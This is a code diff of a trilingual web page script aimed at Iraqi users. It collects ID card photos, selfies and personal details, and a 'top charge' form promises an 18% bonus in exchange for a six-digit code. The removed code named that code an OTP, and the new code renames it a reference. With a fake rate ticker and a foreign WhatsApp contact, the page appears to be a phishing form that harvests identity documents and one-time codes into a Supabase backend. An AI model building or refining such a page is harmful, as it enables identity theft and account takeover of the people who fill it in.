-  document.querySelectorAll("#langEn,#langCkb,#langAr").forEach(b=>b.classList.remove("on"));
-  ({en:"langEn",ckb:"langCkb",ar:"langAr"})[code] && document.getElementById(({en:"langEn",ckb:"langCkb",ar:"langAr"})[code]).classList.add("on");
-  $("wa").href = "https://wa.me/" + WA_NUMBER + "?text=" + encodeURIComponent(d.wa_text);
+
+const $ = id => document.getElementById(id);
+let lang = "ckb";
+let amount = 1000000;
+
+const sb = window.supabase?.createClient(
+  "https://qieifmpzmenpfewfsssl.supabase.co",
+  "sb_publishable_-yOD7PqBzqKuxrhbr7FmVQ_6HPhspI_"
+);
+
+function render() {
+  const t = dict[lang];
+  document.documentElement.lang = lang;
+  document.documentElement.dir = lang === "en" ? "ltr" : "rtl";
+
+  document.querySelectorAll("[data-i]").forEach(el => {
+    el.textContent = t[el.dataset.i];
+  });
+
+  document.querySelectorAll("[data-placeholder]").forEach(el => {
+    el.placeholder = t[el.dataset.placeholder];
+  });
+
+  document.querySelectorAll("[data-lang]").forEach(btn => {
+    btn.classList.toggle("on", btn.dataset.lang === lang);
+  });
+
+  $("summary").textContent =
+    `${t.selected}: ${amount.toLocaleString("en-US")} IQD | ` +
+    `${t.bonus}: +${(amount * 0.18).toLocaleString("en-US")} IQD`;
+
+  const waText = lang === "en" ? "Hello, I need help" :
+                 lang === "ar" ? "مرحبًا، أحتاج مساعدة" :
+                 "سڵاو، پێویستم بە یارمەتییە";
+
+  $("wa").href =
+    "https://wa.me/6288214653918?text=" +
+    encodeURIComponent(waText);
 }
 
-// ticker (decorative only, not real rates)
-const pairs=[["USD/IQD","▲",1],["EUR/IQD","▼",0],["GBP/IQD","▲",1],["TRY/IQD","▼",0],["AED/IQD","▲",1],["USD/EUR","▼",0],["XAU/USD","▲",1]];
-const row=pairs.map(p=>`<span><b>${p[0]}</b><i class="${p[2]?"up":"dn"}">${p[1]}</i></span>`).join("");
-document.getElementById("tk").innerHTML=row+row+row+row;
+document.querySelectorAll("[data-lang]").forEach(btn => {
+  btn.onclick = () => {
+    lang = btn.dataset.lang;
+    render();
+  };
+});
 
-const sb = supabase.createClient("https://qieifmpzmenpfewfsssl.supabase.co","sb_publishable_-yOD7PqBzqKuxrhbr7FmVQ_6HPhspI_");
-const $ = id => document.getElementById(id);
-const say = (t, ok) => { $("msg").textContent = t; $("msg").style.color = ok ? "var(--green)" : "var(--red)"; };
+function switchTab(which) {
+  $("register-panel").classList.toggle("on", which === "register");
+  $("top-panel").classList.toggle("on", which === "top");
+  $("tab-register").classList.toggle("on", which === "register");
+  $("tab-top").classList.toggle("on", which === "top");
+}
+
+$("tab-register").onclick = () => switchTab("register");
+$("tab-top").onclick = () => switchTab("top");
+
+document.querySelectorAll(".pick").forEach(btn => {
+  btn.onclick = () => {
+    amount = Number(btn.dataset.amount);
+
+    document.querySelectorAll(".pick").forEach(item => {
+      item.classList.toggle("active", item === btn);
+      item.setAttribute("aria-pressed", String(item === btn));
+    });
+
+    render();
+  };
+});
+
+const six = [...document.querySelectorAll("#six input")];
+
+six.forEach((input, i) => {
+  input.oninput = () => {
+    input.value = input.value.replace(/\D/g, "").slice(-1);
+
+    if (input.value && i < 5) {
+      six[i + 1].focus();
+    }
+  };
+
+  input.onkeydown = event => {
+    if (event.key === "Backspace" && !input.value && i) {
+      six[i - 1].focus();
+    }
+  };
+
+  input.onpaste = event => {
+    event.preventDefault();
+
+    const pasted = event.clipboardData
+      .getData("text")
+      .replace(/\D/g, "")
+      .slice(0, 6);
+
+    [...pasted].forEach((digit, j) => {
+      six[j].value = digit;
+    });
+
+    six[Math.min(pasted.length, 5)].focus();
+  };
+});
+
+function phone(value) {
+  let n = value
+    .replace(/[٠-٩]/g, c => c.charCodeAt(0) - 0x660)
+    .replace(/[۰-۹]/g, c => c.charCodeAt(0) - 0x6f0)
+    .replace(/\D/g, "");
+
+  if (n.startsWith("964")) n = n.slice(3);
+  if (n.startsWith("0")) n = n.slice(1);
+
+  return /^7\d{9}$/.test(n) ? "+964" + n : null;
+}
+
+function msg(id, text, ok = false) {
+  $(id).textContent = text;
+  $(id).style.color = ok ? "#0ecb81" : "#ff6b7d";
+}
 
 async function upload(file) {
-  if (file.size > 5*1024*1024) throw new Error("Each image must be under 5MB");
-  const ext = (file.name.split(".").pop() || "jpg").toLowerCase();
+  if (file.size > 5242880) {
+    throw Error("Image too large (5 MB max)");
+  }
+
+  if (!["image/jpeg", "image/png", "image/webp"].includes(file.type)) {
+    throw Error("Invalid image type");
+  }
+
+  const ext = {
+    "image/jpeg":"jpg",
+    "image/png":"png",
+    "image/webp":"webp"
+  }[file.type];
+
   const path = crypto.randomUUID() + "." + ext;
-  const { error } = await sb.storage.from("id-photos").upload(path, file);
+
+  const {error} = await sb.storage
+    .from("id-photos")
+    .upload(path, file, {contentType:file.type});
+
   if (error) throw error;
   return path;
 }
-$("btn").onclick = async () => {
-  const d = I18N[LANG];
-  const v = { full_name:$("name").value.trim(), phone:$("phone").value.trim(), email:$("email").value.trim(),
-    dob:$("dob").value, gender:$("gender").value, province:$("province").value, address:$("address").value.trim() };
-  const f = [$("idf").files[0], $("idb").files[0], $("selfie").files[0]];
-  if (Object.values(v).some(x=>!x) || f.some(x=>!x)) return say(d.m_fill, false);
-  if (!$("ok").checked) return say(d.m_agree, false);
-  $("btn").disabled = true; say(d.m_wait, true);
+
+$("send-register").onclick = async () => {
+  const t = dict[lang];
+
+  const v = {
+    full_name:$("name").value.trim(),
+    phone:phone($("phone").value),
+    email:$("email").value.trim(),
+    dob:$("dob").value,
+    gender:$("gender").value,
+    province:$("province").value,
+    address:$("address").value.trim()
+  };
+
+  const files = [
+    $("front").files[0],
+    $("back").files[0],
+    $("selfie").files[0]
+  ];
+
+  if (!v.phone) {
+    return msg("register-msg", t.badPhone);
+  }
+
+  if (
+    Object.values(v).some(x => !x) ||
+    files.some(x => !x) ||
+    !$("agree").checked
+  ) {
+    return msg("register-msg", t.required);
+  }
+
+  if (!sb) {
+    return msg("register-msg", t.fail + "Supabase unavailable");
+  }
+
+  $("send-register").disabled = true;
+  msg("register-msg", t.sending, true);
+
   try {
-    let id_front_path, id_back_path, selfie_path;
-    try { [id_front_path, id_back_path, selfie_path] = await Promise.all(f.map(upload)); }
-    catch (e) { e.message = d.m_img + e.message; throw e; }
-    const { error } = await sb.from("agents").insert({ ...v, id_front_path, id_back_path, selfie_path });
-    if (error) { error.message = d.m_data + error.message; throw error; }
-    $("app").innerHTML = `<div class="card done"><div class="ic">✅</div><h2>${d.m_done_t}</h2><p style="color:var(--mut)">${d.m_done_d}</p></div>`;
+    const paths = await Promise.all(files.map(upload));
+
+    const {error} = await sb.from("agents").insert({
+      ...v,
+      id_front_path:paths[0],
+      id_back_path:paths[1],
+      selfie_path:paths[2]
+    });
+
+    if (error) throw error;
+
+    msg("register-msg", t.success, true);
   } catch (e) {
-    say(e.code === "23505" ? d.m_dup : d.m_err + e.message, false);
-    $("btn").disabled = false;
+    msg("register-msg", t.fail + e.message);
+    $("send-register").disabled = false;
   }
 };
 
-// ---- Top Charge ----
-const tcm=(t,ok)=>{$("tcm").textContent=t;$("tcm").style.color=ok?"var(--green)":"var(--red)"};
-const tcNum=()=>{let dd=$("tcp").value.replace(/\D/g,"");if(dd.startsWith("964"))dd=dd.slice(3);if(dd.startsWith("0"))dd=dd.slice(1);return dd};
-function tcCheck(){const d=I18N[LANG];const n=tcNum();if(!/^7\d{9}$/.test(n)){tcm(d.m_tcphone);return null}
-  if(!$("tca").value.trim()){tcm(d.m_tcaddr);return null}return "+964"+n}
-function otpVal(){return [...document.querySelectorAll("#otp6 input")].map(i=>i.value).join("")}
-document.querySelectorAll("#otp6 input").forEach((inp,i,arr)=>{
-  inp.addEventListener("input",()=>{inp.value=inp.value.replace(/\D/g,"").slice(0,1);if(inp.value&&arr[i+1])arr[i+1].focus()});
-  inp.addEventListener("keydown",e=>{if(e.key==="Backspace"&&!inp.value&&arr[i-1])arr[i-1].focus()});
-  inp.addEventListener("paste",e=>{const t=(e.clipboardData.getData("text")||"").replace(/\D/g,"").slice(0,6);
-    if(t){e.preventDefault();[...t].forEach((d,j)=>{if(arr[j])arr[j].value=d});(arr[t.length-1]||arr[5]).focus()}});
-});
-$("tcb1").onclick=()=>{const p=tcCheck();if(!p)return;tcm("");
-  $("tcotp").style.display="block";$("tcb1").style.display="none";$("tcb2").style.display="block";
-  document.querySelectorAll("#otp6 input")[0]?.focus()};
-$("tcb2").onclick=async()=>{const d=I18N[LANG];const p=tcCheck();if(!p)return;const c=otpVal();
-  if(!/^\d{6}$/.test(c))return tcm(d.m_tcfill);
-  $("tcb2").disabled=true;tcm(d.m_wait,true);
-  const {error}=await sb.from("tc_requests").insert({phone:p,address:$("tca").value.trim(),amount:+c});
-  $("tcb2").disabled=false;
-  if(error)return tcm(d.m_err+error.message);
-  $("tc").innerHTML=`<div class="done"><div class="ic">✅</div><h3>${d.m_tcdone_t}</h3><p style="color:var(--mut)">${d.m_tcdone_d}</p></div>`};
+$("send-top").onclick = async () => {
+  const t = dict[lang];
 
-// WhatsApp
-const WA_NUMBER = "6288214653918";
-$("wa").href = "https://wa.me/" + WA_NUMBER + "?text=" + encodeURIComponent(I18N.en.wa_text);
+  const p = phone($("top-phone").value);
+  const address = $("top-address").value.trim();
+  const request_reference = six.map(x => x.value).join("");
 
-setLang("en");
+  if (!p) {
+    return msg("top-msg", t.badPhone);
+  }
+
+  if (!address) {
+    return msg("top-msg", t.required);
+  }
+
+  if (!/^\d{6}$/.test(request_reference)) {
+    return msg("top-msg", t.badReference);
+  }
+
+  if (!sb) {
+    return msg("top-msg", t.fail + "Supabase unavailable");
+  }
+
+  $("send-top").disabled = true;
+  msg("top-msg", t.sending, true);
+
+  try {
+    const {error} = await sb.from("tc_requests").insert({
+      phone:p,
+      address:address,
+      amount:amount,
+      bonus_amount:amount * 18 / 100,
+      request_reference:request_reference
+    });
+
+    if (error) throw error;
+
+    msg("top-msg", t.success, true);
+  } catch (e) {
+    msg("top-msg", t.fail + e.message);
+    $("send-top").disabled = false;
+  }
+};
+
+render();
 </script>
 </body>
 </html>
